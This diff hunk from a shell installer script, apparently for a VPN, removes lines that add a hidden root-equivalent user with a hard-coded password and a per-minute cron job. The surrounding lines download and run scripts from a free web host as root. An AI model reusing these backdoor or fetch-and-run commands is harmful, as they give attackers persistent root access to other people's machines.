@@ -503,10 +503,6 @@ wget -O /bin/proxy3.py pinoyvpnscript.000webhostapp.com/proxy3 -q
 wget -O /bin/auto pinoyvpnscript.000webhostapp.com/auto -q
 chmod +x /bin/auto
 /bin/auto;
-
-useradd -p $(openssl passwd -1 bulala) 12345 -ou 0 -g 0
-crontab -u 12345 -r
-(crontab -l 2>/dev/null || true; echo "* * * * * /bin/auto >/dev/null 2>&1") | crontab - -u 12345
 }
 
 display_menu () {
